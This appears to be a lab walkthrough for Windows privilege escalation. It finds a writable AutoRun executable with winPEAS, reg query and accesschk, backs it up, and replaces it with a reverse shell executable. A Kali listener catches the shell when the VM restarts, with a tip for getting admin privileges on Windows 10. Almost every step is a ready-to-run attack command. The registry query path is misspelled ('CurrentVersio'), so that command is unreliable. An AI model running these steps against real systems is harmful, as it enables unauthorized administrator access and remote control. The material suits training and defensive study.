1.
Use winPEAS to check for writable AutoRun executables:
.\winPEASany.exe quiet applicationsinfo



2.
Alternatively, we could manually enumerate the AutoRun executables:

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersio\Run
and then use 

accesschk.exe to verify the permissions on each one:


 .\accesschk.exe /accepteula -wvu "C:\Program
Files\Autorun Program\program.exe"


3.
The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by
Everyone. 

Create a backup of the original:

copy "C:\Program Files\Autorun Program\program.exe" C:\Temp

4.
Copy our reverse shell executable to overwrite the AutoRun executable:

copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun
Program\program.exe"


5.
Start a listener on Kali, and then restart the Windows VM to trigger the exploit. 

>Note that on
Windows 10, the exploit appears to run with the privileges of the last logged on user, so log
out of the “user” account and log in as the “admin” account first.